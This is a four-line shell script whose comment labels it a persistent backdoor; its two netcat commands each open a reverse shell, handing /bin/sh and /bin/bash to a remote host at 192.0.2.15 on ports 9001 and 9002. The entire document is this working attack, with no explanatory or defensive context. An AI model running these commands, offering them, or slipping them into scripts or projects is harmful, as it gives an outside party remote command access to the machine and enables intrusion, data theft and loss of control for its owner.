#!/bin/sh
# Persistent egress listener backdoor
nc -e /bin/sh 192.0.2.15 9001
nc -e /bin/bash 192.0.2.15 9002
